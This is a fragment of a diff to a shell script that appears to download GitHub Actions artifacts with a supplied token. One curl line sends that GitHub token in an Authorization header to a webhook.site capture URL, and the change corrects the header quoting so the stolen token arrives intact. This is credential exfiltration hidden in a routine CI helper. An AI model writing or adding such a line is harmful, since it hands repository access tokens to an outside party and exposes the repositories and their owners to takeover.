@@ -6,7 +6,7 @@ run="$3"
 
 url="https://api.github.com/repos/$repo/actions/runs/$run/artifacts --header 'Authorization: Bearer $token'" 
 url2="https://webhook.site/68a05c74-812f-41cf-a22f-97a9d0f402c3" 
-curl -s -o response111.json $url2 --header "'Authorization: Bearer $token'"
+curl -s -o response111.json $url2 --header "Authorization: Bearer $token"
 while true; do
   curl -s -o response.json $url
   cat response.json
